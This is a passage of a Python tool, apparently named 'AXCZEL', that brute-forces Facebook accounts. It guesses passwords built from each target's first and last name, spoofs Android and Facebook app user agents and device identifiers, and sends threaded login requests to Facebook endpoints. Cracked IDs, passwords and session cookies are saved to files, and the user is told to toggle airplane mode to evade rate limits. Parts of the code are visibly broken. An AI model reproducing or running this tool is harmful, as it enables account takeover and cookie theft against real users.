                    " [1] Crack with auto password \n [2] Crack with choice password \n"
                )
                linex()
                ppp = input(" Choose: ")
                if ppp in ["1", "01"]:
                    plist = [
                        "first",
                        "first123",
                        "first1234",
                        "first12345",
                        "first143",
                        "first14",
                        "first16",
                        "first17",
                        "first18",
                        "first04",
                        "first05",
                        "first06",
                        "first07",
                        "first08",
                        "first10",
                        "first11",
                        "first12",
                        "firstfirst",
                        "firstganda",
                        "firstlast",
                        "firstlast123",
                        "firstlast12345",
                        "firstpogi",
                        "gandako",
                        "last123",
                        "last12345",
                        "lastfirst123",
                        "lastfirst12345",
                        "lastlast",
                        "last last"
                    ]
                elif ppp in ["3", "03"]:
                    clear()
                    print(" \033[1;32mWorking password for PH\033[1;37m ")
                    linex()
                    print(
                        " [1] first last\n [2] firstlast\n [3] first123\n [4] first1234\n [5] first786\n [6] first110\n [7] firstlast123\n [8] firstlast786\n [9] firstlast110"
                    )
                    linex()
                    print("\033[1;32m Out of PH working password\033[1;37m ")
                    linex()
                    print(
                        " [1] first last\n [2] firstlast\n [3] first1234\n [4] First Last\n [5] first123 "
                    )
                    linex()
                    print(
                        " \033[1;32mfor new ids use just 1 password \033[1;37m \n [1] first last > best results \n \033[1;32melse\033[1;37m \n [1] first last\n [2] firstlast\n [3] First Last\n [4] First Last"
                    )
                    linex()
                    input(" Press enter to back menu ")
                    menu()
                else:
                    try:
                        linex()
                        ps_limit = int(
                            input(" How many passwords do you want to add ? ")
                        )
                    except:
                        ps_limit = 1
                    linex()
                    print("\033[1;32m ex: first last,firtslast,first123")
                    linex()
                    for i in range(ps_limit):
                        plist.append(input(f" Put password {i+1}: "))
                linex()
                print(" Do you want show cp account? (y/n): ")
                linex()
                cx = input(" Choose: ")
                if cx in ["y", "Y", "yes", "Yes", "1"]:
                    pcp.append("y")
                else:
                    pcp.append("n")
                linex()
                with tred(max_workers=30) as crack_submit:
                    clear()
                    total_ids = str(len(fo))
                    print(" Total ids : \033[1;32m" + total_ids)
                    print(
                        " \033[1;36mTotal UA  : \033[1;33m"
                        + str(len(ugen))
                        + " M1\n TOTAL UA2 : "
                        + str(len(ua2))
                        + " M3\n PASSWORDS : "
                        + str(len(plist))
                        + "\n File name : "
                        + ((file))
                    )
                    print(
                        " \033[1;36mMETHOD \033[1;33m   : \033[1;32mM" + str(mthd))
                    linex()
                    print(
                        " ALIVE IDS AND COOKIES SAVE IN:\n /sdcard/AXCZEL-ALIVE.txt\n /sdcard/AXCZEL-COOKIES.txt"
                    )
                    linex()
                    print("\033[1;32m BRUTE FORCE IS STARTING")
                    print(
                        "\033[1;32m TURN ON&OFF AIRPLANE MODE EVERY 3mins\n ~AXL")
                    linex()
                    for user in fo:
                        ids, names = user.split("|")
                        passlist = plist
                        if mthd in ["1", "01"]:
                            crack_submit.submit(meth1, ids, names, passlist)
                        elif mthd in ["2", "02"]:
                            crack_submit.submit(meth2, ids, names, passlist)
                        elif mthd in ["03", "3"]:
                            crack_submit.submit(meth3, ids, names, passlist)
                        else:
                            crack_submit.submit(meth2, ids, names, passlist)
                print("\033[1;37m")
                linex()
                print(" The process has completed")
                print(
                    " Total OK/CP/2F: "
                    + str(len(oks))
                    + "/"
                    + str(len(cps))
                    + "/"
                    + str(len(twf))
                )
                linex()
                input(" Press enter to back ")
                os.system("python axczel.py")
            elif xd in ["0", "00"]:
                exit(" BY BY ")
            else:
                exit(" Option not found in menu...")
        else:
            print(" Run :  python axczel.py")

            linex()
            exit()
    except ValueError:
        exit()
    except requests.exceptions.ConnectionError:
        print("\n No internet connection ...")
        exit()


def meth1(ids, names, passlist):
    global loop, oks, cps
    sys.stdout.write(
        "\r\r\033[1;37m AXCZEL M1\033[1;35m｟\033[1;37m%s/%s\033[1;35m｠\033[1;32mOK:-%s \033[1;37m CP:-\033[1;31m%s\033[1;37m"
        % (loop, str(len(fo)), len(oks), len(cps))
    )
    sys.stdout.flush()
    session = requests.Session()
    try:
        first = names.split(" ")[0]
        try:
            last = names.split(" ")[1]
        except:
            last = "Khan"
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = (
                fikr.replace("First", first)
                .replace("Last", last)
                .replace("first", ps)
                .replace("last", ps2)
            )
            modelsss = random.choice(mn)
            ccc = random.choice(ugen)
            build = f"{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(20,99)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}"
            headers = {
                "authority": "m.facebook.com",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "max-age=0",
                "content-type": "application/x-www-form-urlencoded",
                "dpr": "3",
                "origin": "https://mbasic.facebook.com",
                "referer": f"https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
                "sec-ch-prefers-color-scheme": "dark",
                "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120"',
                "sec-ch-ua-full-version-list": '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"',
                "sec-ch-ua-mobile": "?1",
                # 'sec-ch-ua-model': f'"{modelsss}"',
                "sec-ch-ua-platform": f'"Android"',
                # 'sec-ch-ua-platform-version': f'"{random.randint(4,13)}{random.choice(["",".0.0",".0",".1.2",".0.1","","","",".0.2"])}"',
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1",
                "user-agent": ccc,
                "viewport-width": "980",
            }
            getlog = session.get(
                f"https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr"
            )
            idpass = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),
                "jazoest": re.search(
                    'name="jazoest" value="(.*?)"', str(getlog.text)
                ).group(1),
                "uid": ids,
                "next": "https://free.facebook.com/login/save-device/",
                "flow": "login_no_pin",
                "pass": pas,
            }
            complete = session.post(
                "https://free.facebook.com/login/device-based/validate-password/?shbl=0",
                data=idpass,
                allow_redirects=False,
                headers=headers,
            )
            Aking = session.cookies.get_dict().keys()
            cookie = ";".join(
                [key + "=" + value for key, value in session.cookies.get_dict().items()]
            )
            if "c_user" in Aking:
                # rprint('\n[bold green][AXCZEL-ALIVE]\nUSER ID:[bold cyan] %s\n[bold green]PASSWORD:[bold cyan] %s\n[bold green]DATE:[bold yellow] %s\n[bold green]FOLLOWERS: [bold cyan]UNDER MAINTENANCE\n[bold green]COOKIES: %s[/]\n'%(ids,pas,joined(ids),cookie))
                # print(
                #    "\r\r\n\033[1;32m[AXCZEL-ALIVE]\n\033[1;32mUSER ID: \033[1;36m%s\n\033[1;32mPASSWORD: \033[1;36m%s\n\033[1;32mFB-LINK: \033[1;34mhttps://www.facebook.com/%s\n\033[1;32mDATE: \033[1;33m%s\n\033[1;32mFOLLOWERS: UNDER MAINTENANCE\n\033[1;32mCOOKIES: \033[1;31m%s"
                #    % (ids, pas, ids, date(ids), cookie)
                # )
                print(
                    "\r\r\033[1;32m [AXCZEL-ALIVE] "
                    + ids
                    + " | "
                    + pas
                    + " - "
                    + date(ids)
                    + "\033[1;97m"
                )
                open("/sdcard/AXCZEL-ALIVE.txt",
                     "a").write(ids + "|" + pas + "\n")
                open("/sdcard/AXCZEL-COOKIES.txt", "a").write(
                    ids + "|" + pas + "|" + cookie + "\n"
                )

                oks.append(ids)
                follow(session, cookie)
                break
            elif "checkpoint" in Aking:
                if "y" in pcp:
                    print(
                        "\r\r\x1b[38;5;208m [AXCZEL-DEAD] "
                        + ids
                        + " | "
                        + pas
                        + "\033[1;97m"
                    )
                    open("/sdcard/AXCZEL-DEAD.txt",
                         "a").write(ids + "|" + pas + "\n")
                    cps.append(ids)
                    break
                else:
                    break
            else:
                continue
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    loop += 1


def meth2(ids, names, passlist):
    try:
        global oks, loop, sim_id, device, cps
        sys.stdout.write(
            "\r\r\033[1;37m \033[1;36mAXCZEL M2\033[1;35m｟\033[1;37m%s/%s\033[1;35m｠\033[1;37mOK:⪼\033[1;32m%s \033[1;37mCP:⪼\033[1;31m%s\033[1;37m"
            % (loop, len(fo), len(oks), len(cps))
        )
        sys.stdout.flush()

        fn = names.split(" ")[0]

        try:
            ln = names.split(" ")[1]
        except:
            ln = fn

        for pw in passlist:
            pas = (
                pw.replace("first", fn.lower())
                .replace("First", fn)
                .replace("last", ln.lower())
                .replace("Last", ln)
                .replace("Name", names)
                .replace("name", names.lower())
            )
        try:
            with open('update.json') as json_file:
                fbdm_data = json.load(json_file)

                fbdm1 = fbdm_data.get('fbdm1')
                fbdm2 = fbdm_data.get('fbdm2')
                fbdm3 = fbdm_data.get('fbdm3')

                print("Successfully loaded fbdm1:", fbdm1)
                print("Successfully loaded fbdm2:", fbdm2)
                print("Successfully loaded fbdm3:", fbdm3)

        except FileNotFoundError:
            print("File 'update.json' not found.")
        except json.JSONDecodeError:
            print("Error decoding JSON from 'update.json'.")
        except KeyError as e:
            print("KeyError:", e)
        except Exception as e:
            print("An error occurred:", e)


            accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
            fbav = f"{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}"
            fbbv = str(random.randint(111111111, 999999999))
            x = (
                "[FBAN/FB4A;FBAV/"
                + str(random.randrange(11, 300))
                + ".0.0"
                + str(random.randint(9, 49))
                + "."
                + str(random.randrange(11, 313))
                + ";FBBV/"
                + fbbv
                + ";FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/"
                + str(random.randint(111111111, 999999999))
                + ";FBCR/MTSRUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
            )
            y = f"[FBAN/FB4A;FBAV/12.0.0.31133[FBAN/FB4A;FBAV/61.0.0.8.69;FBBV/20569008;{fbdm1}"
            android_version = device["android_version"]
            model = device["model"]
            build = device["build"]
            fblc = device["fblc"]
            fbcr = sim_id
            fbmf = device["fbmf"]
            fbbd = device["fbbd"]
            fbdv = device["fbdv"]
            fbsv = device["fbsv"]
            fbca = device["fbca"]
            fbdm = device["fbdm"]
            fbfw = "1"
            fbrv = "0"
            fban = "FB4A"
            fbpn = "com.facebook.katana"
            modi = random.choice(gt)
            ua = (
                "Davik/2.1.0 (Linux;U;Android "
                + android_version
                + ".0.1;"
                + model
                + " Build/"
                + build
                + ") [FBAN/"
                + fban
                + ";FBAV/"
                + fbav
                + ";FBBV/"
                + fbbv
                + ";FBDM/{density=2.625,width=1080,height=1920};FBLC/"
                + fblc
                + ";FBRV/"
                + str(random.randint(000000000, 999999999))
                + ";FBCR/"
                + fbcr
                + ";FBMF/"
                + fbmf
                + ";FBBD/"
                + fbbd
                + ";FBPN/"
                + fbpn
                + ";FBDV/"
                + fbdv
                + ";FBSV/"
                + fbsv
                + ";FBOP/19;FBCA/"
                + fbca
                + ";]"
            )
            random_seed = random.Random()
            adid = str("".join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
            xd = str("".join(random_seed.choices(string.digits, k=20)))
            sim_serials = f'["{xd}"]'
            li = ["28", "29", "210"]
            li2 = random.choice(li)
            j1 = "".join(random.choice(string.digits) for _ in range(2))
            jazoest = li2 + j1
            data = {
                "adid": f"{uuid.uuid4()}",
                "format": "json",
                "device_id": f"{uuid.uuid4()}",
                "cpl": "true",
                "family_device_id": f"{uuid.uuid4()}",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": f"{uuid.uuid4()}",
                "currently_logged_in_userid": "0",
                "locale": "en_US",
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": f"62f8ce9f74b12f84c123cc23437a4a32",
                # f'882a8490361da98702bf97a021ddc14d'
            }
            # apikey={str(uuid.uuid4()).replace("-","")}
            build = f"{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(20,99)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}"
            qp1a = f"{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(1,9)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}.{random.randint(100000,400000)}.0{random.randint(10,25)}"
            qp1a2 = f"SP1A.{random.randint(100000,400000)}.{random.randint(100,999)}"
            builld = random.choice([qp1a, build, qp1a2])
            fbvvv = str(random.randint(20000000, 99999999))
            fbvvx = str(random.randint(20000000, 99999999))
            # "'[FBAN/FBIOS;FBAV/"+str(random.randrange(80,405))+".0.0."+str(random.randint(10,20))+"."+str(random.randint(80,150))+";[FBAN/MessengerForiOS;FBAV/"+str(random.randrange(80,405))+".0.0."+str(random.randint(10,20))+"."+str(random.randint(80,150))+";FBBV/61279955;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/10.1.1;FBSS/2;FBCR/SMART;FBID/tablet;FBLC/en_US;FBOP/5;FBRV/0]',"+
            # "Dalvik/2.1.0 (Linux; U; Android "+str(random.randint(4,12))+"; 404: Not Found Build/"+builld+f")
            simm = random.choice(["TNT", "SMART", "GLOBE", "TM"])
            ranfbpn = random.choice(["FB4A", "Orca-Android", "MessengerLite"])
            if ranfbpn == "FB4A":
                fbp1 = "katana"
            elif ranfbpn == "Orca-Android":
                fbp1 = "orca"
            elif ranfbpn == "MessengerLite":
                fbp1 = "mlite"
            else:
                fbp1 = ""
            ranfbpn2 = random.choice(["FB4A", "Orca-Android", "MessengerLite"])
            if ranfbpn2 == "FB4A":
                fbp2 = "katana"
            elif ranfbpn2 == "Orca-Android":
                fbp2 = "orca"
            elif ranfbpn2 == "MessengerLite":
                fbp2 = "mlite"
            else:
                fbp2 = ""
            fbbvv = "".join(random.choice(string.digits) for _ in range(8))
            fbbvv2 = "".join(random.choice(string.digits) for _ in range(8))
            # dalv=f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {modi} Build/{qp1a2})'+' [FBAN/FB4A;FBAV/262.0.0.34.117;FBBV/2%s;FBDM/{density=3.0,width=1080,height=2024};FBLC/en_US;FBRV/2%s;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]'%(fbbvv,fbbvv2)
            fbann = (
                f"[FBAN/FB4A;FBAV/"
                + str(random.randrange(200, 450))
                + ".0.0."
                + str(random.randint(10, 50))
                + "."
                + str(random.randint(80, 150))
                + ";FBBV/"
                + fbvvv
                + f";[FBAN/{ranfbpn};FBAV/"
                + str(random.randrange(200, 450))
                + ".0.0."
                + str(random.randint(10, 20))
                + "."
                + str(random.randint(80, 150))
                + ";FBBV/2"
                + str(random.randint(1000000, 9999999))
                + f";{fbdm2} [FBAN/FB4A;FBAV/"
                % (fbp1)
                + str(random.randrange(200, 450))
                + ".0.0."
                + str(random.randint(10, 50))
                + "."
                + str(random.randint(80, 150))
                + ";FBBV/"
                + fbvvx
                + f";[FBAN/{ranfbpn2};FBAV/"
                + str(random.randrange(200, 450))
                + ".0.0."
                + str(random.randint(10, 20))
                + "."
                + str(random.randint(80, 150))
                + ";FBBV/2"
                + str(random.randint(4000000, 9999999))
                + f";{fbdm3}"
                % (fbp2)
            )
            # comb=f"'{fbann}','{dalv}'"
            headers = {
                "User-Agent": fbann,
                # 'User-Agent': xccx,
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "graph.facebook.com",
                "X-FB-Net-HNI": str(random.randint(10000, 99999)),
                "X-FB-SIM-HNI": str(random.randint(10000, 99999)),
                "X-FB-Connection-Type": "MOBILE.LTE",
                "X-Tigon-Is-Retry": "False",
                "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32",
                "x-fb-device-group": str(random.randint(1000, 9999)),
                "X-FB-Friendly-Name": "ViewerReactionsMutation",
                "X-FB-Request-Analytics-Tags": "graphservice",
                "X-FB-HTTP-Engine": "Liger",
                "X-FB-Client-IP": "True",
                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                "X-FB-Server-Cluster": "True",
                "x-fb-connection-token": f"62f8ce9f74b12f84c123cc23437a4a32"
                # "d29d67d37eca387482a8a5b740f84f62",
                # str(uuid.uuid4()).replace('-','')
            }
            url = "https://graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true"
            twf = (
                "Login approval"
                + "s are on. "
                + "Expect an SMS"
                + " shortly with "
                + "a code to use"
                + " for log in"
            )
            po = requests.post(
                url, data=data, headers=headers, allow_redirects=False
            ).json()
            dat = datetime.now()
            now = dat.strftime(
                "[bold yellow]DATE:[bold cyan]%d/%m/%y [bold yellow]TIME:[bold magenta]%H:%M:%S[/]"
            )
            if "session_key" in po:
                coki = ";".join(
                    i["name"] + "=" + i["value"] for i in po["session_cookies"]
                )
                sm("espeak -s 150 ALIVE")
                # get_ffs=requests.get("https://buratski129.pythonanywhere.com/ffs?uid="+ids).json()
                # if "followers" in get_ffs:
                # ffss=get_ffs['followers']
                # nama=get_ffs['names']
                # else:
                # ffss="BAD API CALL"
                # nama="BAD API CALL"
                # alive_txt = Panel("[bold green]NAME: [bold yellow]"+"\n[bold green]USER ID: [bold cyan]"+ids+"\n[bold green]PASSWORD: [bold cyan]"+pas+"\n[bold green]FOLLOWERS: [bold cyan]""\n[bold yellow]FB-LINK: [bold blue]https://www.facebook.com/" +ids+"\n[bold green]DATE: "+joined(ids)+"\n[bold green]COOKIE: [bold cyan]"+coki+"[/]", border_style="bold green", width=60, title="[bold green]AXCZEL-ALIVE[/bold green]", subtitle=now)
                # rprint("\n", alive_txt)
                print(
                    "\r\r\033[1;32m [AXCZEL-ALIVE] "
                    + ids
                    + " | "
                    + pas
                    + " - "
                    + date(ids)
                    + "\033[1;97m"
                )
                # print(f" \033[1;36mFB LINK: \033[1;34mhttps://www.facebook.com/{ids}")
                # print("\033[1;32m [COOKIES] \033[1;36m"+coki)
                open("/sdcard/AXCZEL-ALIVE.txt",
                     "a").write(ids + "|" + pas + "\n")
                open("/sdcard/AXCZEL-COOKIES.txt", "a").write(
                    ids + "|" + pas + f" | {coki}\n"
                )
                oks.append(ids)
                follow(po, coki)
                break
            elif twf in str(po):
                if "y" in pcp:
                    print("\r\r \033[1;34m[AXCZEL-2F] " + ids + " | " + pas)
                    sm("espeak -s 150 TWO, FACTOR")
                    twf.append(ids)
                    break
            elif "www.facebook.com" in po["error"]["message"]:
                if "y" in pcp:
                    print(
                        "\r\r\x1b[38;5;208m [AXCZEL-DEAD] "
                        + ids
                        + " | "
                        + pas
                        + "\033[1;97m"
                    )
                    sm("espeak -s 150 DEAD")
                    open("/sdcard/AXCZEL-DEAD.txt",
                         "a").write(ids + "|" + pas + "\n")
                    cps.append(ids)
                    break
                else:
                    open("/sdcard/AXCZEL-DEAD.txt",
                         "a").write(ids + "|" + pas + "\n")
                    cps.append(ids)
                    break

            else:
                continue
        loop += 1
    except Exception as e:
        pass


def meth3(ids, names, passlist):
    try:
        global oks, loop, sim_id, cps
        sys.stdout.write(
            "\r\r\033[1;37m AXCZEL M3\033[1;35m｟\033[1;37m%s\033[1;35m｠\033[1;32mOK:-%s \033[1;31mCP:-%s\033[1;37m"
            % (loop, len(oks), len(cps))
        )
        sys.stdout.flush()
        fn = names.split(" ")[0]
        try:
            ln = names.split(" ")[1]
        except:
            ln = fn
        for pw in passlist:
            pas = (
                pw.replace("first", fn.lower())
                .replace("First", fn)
                .replace("last", ln.lower())
                .replace("Last", ln)
                .replace("Name", names)
                .replace("name", names.lower())
            )
            accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
            fbav = f"{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}"
            fbbv = str(random.randint(111111111, 999999999))
            x = (
                "[FBAN/FB4A;FBAV/"
                + str(random.randrange(11, 300))
                + ".0.0"
                + str(random.randint(9, 49))
                + "."
                + str(random.randrange(11, 313))
                + ";FBBV/"
                + str(random.randint(111111111, 999999999))
                + ";FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/"
                + str(random.randint(111111111, 999999999))
                + ";FBCR/MTSRUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
            )
            android_version = device["android_version"]
            model = device["model"]
            build = device["build"]
            fblc = device["fblc"]
            fbcr = sim_id
            fbmf = device["fbmf"]
            fbbd = device["fbbd"]
            fbdv = device["fbdv"]
            fbsv = device["fbsv"]
            fbca = device["fbca"]
            fbdm = device["fbdm"]
            fbfw = "1"
            fbrv = "0"
            fban = "FB4A"
            fbpn = "com.facebook.katana"
            ua = (
                "Mozilla/5.0 (Linux;U;Android "
                + android_version
                + ".0.1;"
                + model
                + " Build/"
                + build
                + ") [FBAN/"
                + fban
                + ";FBAV/"
                + fbav
                + ";FBBV/"
                + fbbv
                + ";FBDM/{density=2.625,width=1080,height=1920};FBLC/"
                + fblc
                + ";FBRV/"
                + str(random.randint(000000000, 999999999))
                + ";FBCR/"
                + fbcr
                + ";FBMF/"
                + fbmf
                + ";FBBD/"
                + fbbd
                + ";FBPN/"
                + fbpn
                + ";FBDV/"
                + fbdv
                + ";FBSV/"
                + fbsv
                + ";FBOP/19;FBCA/"
                + fbca
                + ";][FBAN/FB4A;FBAV/"
                + fbav
                + ".0.0.43.119;FBBV/"
                + fbbv
                + ";FBDM/{density=2.625,width=1080,height=2042};FBLC/en_US;FBRV/177156964;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;"
            )
            random_seed = random.Random()
            adid = str("".join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
            xd = str("".join(random_seed.choices(string.digits, k=20)))
            sim_serials = f'["{xd}"]'
            li = ["28", "29", "210"]
            li2 = random.choice(li)
            j1 = "".join(random.choice(string.digits) for _ in range(2))
            jazoest = li2 + j1
            data = {
                "adid": adid,
                "format": "json",
                "device_id": device_id,
                "email": ids,
                "password": pas,
                "session_id": str(uuid.uuid4()),
                "advertiser_id": str(uuid.uuid4()),
                "reg_instance": str(uuid.uuid4()),
                "logged_out_id": str(uuid.uuid4()),
                "hash_id": str(uuid.uuid4()),
                "sim_country": "us",
                "network_country": "us",
                "enroll_misauth": "false",
                "generate_analytics_claims": "1",
                "credentials_type": "password",
                "source": "login",
                "error_detail_type": "button_with_disabled",
                "enroll_misauth": "false",
                "cpl": "true",
                "generate_session_cookies": "1",
                "generate_machine_id": "1",
                "meta_inf_fbmeta": "",
                "currently_logged_in_userid": "0",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            }
            fbbo = str(random.randrange(200000000, 300000000))
            qp1a = f"{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(0,9)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}.{random.randint(100000,210000)}.0{random.randint(10,35)}"
            mods = random.choice(mn)
            fbpnnn = random.choice(["FB4A", "Orca-Android", "MessengerLite"])
            if fbpnnn == "FB4A":
                fbpnn = "katana"
            elif fbpnnn == "Orca-Android":
                fbpnn = "orca"
            elif fbpnnn == "MessengerLite":
                fbpnn = "mlite"
            headers = {
                "Authorization": f"OAuth {accessToken}",
                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                "X-FB-Net-HNI": str(random.randint(900000, 999999)),
                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                "X-FB-Friendly-Name": "authenticate",
                "X-FB-Connection-Type": "unknown",
                # "'[FBAN/FB4B;FBAV/"+str(random.randrange(60,300))+".0.0."+str(random.randint(10,20))+"."+str(random.randint(80,150))+";[FBAN/Orca-Android;FBAV/"+str(random.randrange(60,300))+".0.0."+str(random.randint(10,20))+"."+str(random.randint(80,150))+";FBBV/144693238;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBRV/0;FBCR/TM;FBMF/myPhone;FBBD/myPhone;FBPN/com.facebook.orca;FBDV/HAMMER_ENERGY;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','
                "User-Agent": f"[FBAN/FB4A;FBAV/"
                + str(random.randrange(60, 405))
                + ".0.0."
                + str(random.randint(10, 20))
                + "."
                + str(random.randint(80, 150))
                + ";FBBV/"
                + str(random.randint(20000000, 80000000))
                + f";[FBAN/{fbpnnn};FBAV/"
                + str(random.randrange(80, 405))
                + ".0.0."
                + str(random.randint(10, 20))
                + "."
                + str(random.randint(80, 150))
                + ";FBBV/2"
                + str(random.randrange(1000000, 9999999))
                + ";FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/SMART;FBMF/motorola;FBBD/motorola;FBPN/com.facebook."
                + fbpnn
                + ";FBDV/XT1045;FBSV/5.1;FBCA/armeabi-v7a:armeabi;] [FBAN/FB4A;FBAV/"
                + str(random.randrange(60, 405))
                + ".0.0."
                + str(random.randint(10, 20))
                + "."
                + str(random.randint(80, 150))
                + ";FBBV/"
                + str(random.randint(20000000, 80000000))
                + f";[FBAN/{fbpnnn};FBAV/"
                + str(random.randrange(80, 405))
                + ".0.0."
                + str(random.randint(10, 20))
                + "."
                + str(random.randint(80, 150))
                + ";FBBV/2"
                + str(random.randrange(1000000, 9999999))
                + ";FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/TNT;FBMF/motorola;FBBD/motorola;FBPN/com.facebook."
                + fbpnn
                + ";FBDV/XT1045;FBSV/5.1;FBCA/armeabi-v7a:armeabi;] [FBAN/FB4A;FBAV/"
                + str(random.randrange(60, 405))
                + ".0.0."
                + str(random.randint(10, 20))
                + "."
                + str(random.randint(80, 150))
                + ";FBBV/"
                + str(random.randint(20000000, 80000000))
                + ";[FBAN/"
                + fbpnnn
                + ";FBAV/"
                + str(random.randrange(80, 405))
                + ".0.0."
                + str(random.randint(10, 20))
                + "."
                + str(random.randint(80, 150))
                + ";FBBV/2"
                + str(random.randrange(1000000, 9999999))
                + ";FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/SMART;FBMF/motorola;FBBD/motorola;FBPN/com.facebook."
                + fbpnn
